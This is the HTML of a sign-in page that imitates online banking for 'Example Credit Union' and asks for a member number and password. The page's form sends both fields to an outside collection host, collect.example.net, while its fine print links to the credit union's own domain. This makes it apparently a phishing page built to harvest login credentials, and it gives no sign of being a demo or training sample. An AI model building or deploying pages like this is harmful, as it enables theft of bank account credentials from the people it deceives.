<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Sign in - Example Credit Union</title>
  <link rel="stylesheet" href="/static/signin.css">
</head>
<body>
  <main class="login-card">
    <h1>Example Credit Union</h1>
    <p class="subtitle">Online banking sign-in</p>

    <form id="signin" action="https://collect.example.net/post" method="POST">
      <label for="member">Member number</label>
      <input id="member" name="member_id" type="text" autocomplete="username" required>

      <label for="password">Password</label>
      <input id="password" name="password" type="password" autocomplete="current-password" required>

      <button type="submit">Sign in</button>
    </form>

    <p class="fine-print">
      Example Credit Union will never ask for your full password by email.
      <a href="https://example.com/security">Security centre</a>
    </p>
  </main>
